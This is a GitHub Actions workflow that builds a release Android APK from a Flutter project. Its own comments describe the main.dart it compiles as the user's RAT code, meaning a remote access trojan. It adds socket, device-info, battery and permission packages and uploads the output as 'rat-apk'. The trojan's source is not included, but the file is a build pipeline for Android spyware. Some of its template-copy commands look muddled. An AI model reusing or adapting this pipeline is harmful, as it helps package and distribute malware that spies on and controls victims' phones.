name: Build APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v3
        with:
          distribution: 'zulu'
          java-version: '17'

      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          flutter-version: '3.19.0'

      # TRIK: Download template project Android V2 yang sudah jadi
      - name: Download Android V2 Template
        run: |
          git clone https://github.com/flutter/flutter.git -b stable --depth 1 /tmp/flutter_source
          cp -r /tmp/flutter_source/packages/flutter_tools/templates/app/android.tmpl ./android
          cp -r /tmp/flutter_source/packages/flutter_tools/templates/app/ios.tmpl ./ios
          
          # Hapus file bawaan template yang bikin error
          rm -rf ./android.tmpl ./ios.tmpl ./lib/main.dart

      # TIMPA dengan kode RAT kamu
      - name: Copy Your Main Dart
        run: cp main.dart lib/main.dart

      # Tambahkan dependencies
      - name: Get Dependencies
        run: flutter pub add socket_io_client device_info_plus battery_plus permission_handler

      # Build!
      - name: Build APK
        run: flutter build apk --release

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: rat-apk
          path: build/app/outputs/flutter-apk/app-release.apk
